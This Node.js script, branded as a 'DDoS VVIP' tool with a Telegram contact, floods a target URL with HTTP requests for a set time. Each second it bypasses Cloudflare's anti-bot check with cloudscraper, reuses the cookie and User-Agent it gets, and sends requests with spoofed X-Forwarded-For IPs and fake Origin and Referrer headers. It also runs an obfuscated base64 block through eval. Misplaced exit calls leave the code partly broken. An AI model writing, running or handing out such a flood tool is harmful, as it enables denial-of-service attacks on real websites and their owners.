var cloudscraper = require('cloudscraper');
var request = require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random() * 256);
}

if (process.argv.length <= 2) {
    console.log(`\x1b[31m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⠀⠀⠀⢀⣤⡶⠁⣠⣴⣾⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⠀⢀⣴⣿⣿⣴⣿⠿⠋⣁⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⣰⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣄⡀⠀⠀⠀⠀⠀ ⠀⠀ \x1b[36m— T O O L S - D D O S - V V I P —
\x1b[31m⠀⣠⣾⣿⡿⠟⠋⠉⠀⣀⣀⣀⣨⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣤⣤⣤⣴⠂ 
\x1b[31m⠈⠉⠁⠀⠀⣀⣴⣾⣿⣿⡿⠟⠛⠉⠉⠉⠉⠉⠛⠻⠿⠿⠿⠿⠿⠿⠟⠋⠁ ______________________________________
\x1b[31m⠀⠀⠀⢀⣴⣿⣿⣿⡿⠁⠀⢀⣀⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀ \x1b[36mExample: node civ.js <url> <time>
\x1b[31m⠀⠀⠀⣾⣿⣿⣿⡿⠁⢀⣴⣿⠋⠉⠉⠉⠉⠛⣿⣿⣶⣤⣤⣤⣤⣶⠖⠀⠀ ⠀
\x1b[31m⠀⠀⢸⣿⣿⣿⣿⡇⢀⣿⣿⣇⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀ 
\x1b[31m⠀⠀⠸⣿⣿⣿⣿⡇⠈⢿⣿⣿⠇⠀⠀⠀⠀⠀⢠⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⢿⣿⣿⣿⣷⡀⠀⠉⠉⠀⠀⠀⠀⠀⢀⣾⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⠀⠙⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⣀⣴⣿⣿⣿⣋⣠⡤⠄⠀⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠁`)}
    process.exit(-1);

var url = process.argv[2];
var time = process.argv[3];

const decodedCode = atob('Y29uc3QgZGVjb2RlZENvZGUgPSBhdG9iKCdLR1oxYm1OMGFXOXVLQ2tnZXdvZ0lDQWdkbUZ5SUY4d2VHRmlZekVnUFNCYkltbHVZMngxWkdWeklpd2dJbHg0TVdKYk16RnRVR1Z1ZVdWeVlXNW5ZVzRnZEdWeWFHRmtZWEFnYzJsMGRYTWdYSGd4WWxzek5tMGlMQ0FpSUdScGJHRnlZVzVuSVNFaFhIZ3hZbHN3YlNJc0lDSmNlREZpV3pNeGJYZHZhU0JyYjJOaGF5Qm5ZWFZ6WVdnZ2MyOXJJR0Z6YVdzZ2RHOXNiMndzSUdsMGRTQjNaV0lnYjNkdVpYSWdaM2RjZURGaVd6QnRJaXdnSWx4NE1XSmJNelp0VTJsc1lXaHJZVzRnWW1WeWFXdGhiaUIxY213Z2JHRnBibHg0TVdKYk1HMGlMQ0FpWlhocGRDSmRPd29nSUNBZ2FXWWdLSFZ5YkZ0Zk1IaGhZbU14V3pCZFhTZ2libTk0YlNJcEtTQjdDaUFnSUNBZ0lDQWdZMjl1YzI5c1pWc2liRzluSWwwb1h6QjRZV0pqTVZzeFhTQXJJSFZ5YkNBcklGOHdlR0ZpWXpGYk1sMHBPd29nSUNBZ0lDQWdJR052Ym5OdmJHVmJJbXh2WnlKZEtGOHdlR0ZpWXpGYk0xMHBPd29nSUNBZ0lDQWdJR052Ym5OdmJHVmJJbXh2WnlKZEtGOHdlR0ZpWXpGYk5GMHBPd29nSUNBZ0lDQWdJSEJ5YjJObGMzTWdPd29nSUNBZ2ZRcDlLU2dwT3c9PScpOwpldmFsKGRlY29kZWRDb2RlKTs=');
eval(decodedCode);

setInterval
var int = setInterval(() => {

    var cookie = 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890';
    var useragent = 'proxy.txt';

    cloudscraper.get(url, function (error, response, body) {
        if (error) {
        } else {
            var parsed = JSON.parse(JSON.stringify(response));
            cookie = (parsed["request"]["headers"]["cookie"]);
            useragent = (parsed["request"]["headers"]["User-Agent"]);
        }

        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
        });

        var ip = randomByte() + '.' +
            randomByte() + '.' +
            randomByte() + '.' +
            randomByte();

        const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '2000',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
        };

        function callback(error, response, body) {
        }

        request(options, callback);
    });
}, 1000);
setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', function (err) {
});

process.on('unhandledRejection', function (err) {
});

console.log(`
\x1b[31m⣿⣯⣿⣟⣟⡼⣿⡼⡿⣷⣿⣿⣿⠽⡟⢋⣿⣿⠘⣼⣷⡟⠻⡿⣷⡼⣝⡿⡾⣿\n⣿⣿⣿⣿⢁⣵⡇⡟⠀⣿⣿⣿⠇⠀⡇⣴⣿⣿⣧⣿⣿⡇⠀⢣⣿⣷⣀⡏⢻⣿\n⣿⣿⠿⣿⣿⣿⠷⠁⠀⠛⠛⠋⠀⠂⠹⠿⠿⠿⠿⠿⠉⠁⠀⠘⠛⠛⠛⠃⢸⣯\n⣿⡇⠀⣄⣀⣀⣈⣁⠈⠉⠃⠀⠀⠀⠀⠀⠀⠀⠀⠠⠎⠈⠀⣀⣁⣀⣀⡠⠈⠉\x1b[32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n\x1b[31m⣿⣯⣽⡿⢟⡿⠿⠛⠛⠿⣶⣄⠀⠀⠀⠀⠀⠀⠈⢠⣴⣾⠛⠛⠿⠻⠛⠿⣷⣶\n⣿⣿⣿⠀⠀⠀⣿⡿⣶⣿⣫⠉⠀⠀⠀⠀⠀⠀⠀⠈⠰⣿⠿⠾⣿⡇⠀⠀⢺⣿\x1b[0m     NAME     : \x1b[36mCīvX\x1b[31m\n⣿⣿⠻⡀⠀⠀⠙⠏⠒⡻⠃⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠐⡓⢚⠟⠁⠀⠀⡾⢫\x1b[0m     TARGET   : \x1b[36m${url}\x1b[31m\n⣿⣿⠀⠀⡀⠀⠀⡈⣉⡀⡠⣐⣅⣽⣺⣿⣯⡡⣴⣴⣔⣠⣀⣀⡀⢀⡀⡀⠀⣸\x1b[0m     DURATION : \x1b[36m${time} seconds\n\x1b[0m⣿⣿⣷⣿⣟⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⢾⣷⣿     TELEGRAM : \x1b[36m@civstyle\n\x1b[0m⣿⣿⣟⠫⡾⠟⠫⢾⠯⡻⢟⡽⢶⢿⣿⣿⡛⠕⠎⠻⠝⠪⢖⠝⠟⢫⠾⠜⢿⣿\n⣿⣿⣿⠉⠀⠀⠀⠀⠈⠀⠀⠀⠀⣰⣋⣀⣈⣢⠀⠀⠀⠀⠀⠀⠀⠀⠀⣐⢸⣿\x1b[32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\x1b[0m⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿\n⣿⣿⣿⣿⣦⡔⠀⠀⠀⠀⠀⠀⢻⣿⡿⣿⣿⢽⣿⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿\n⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠘⠛⢅⣙⣙⠿⠉⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣅⠀⠓⠀⠀⣀⣠⣴⣺⣿⣿⣿⣿⣿⣿⣿⣿
`)
process.exit(-1)
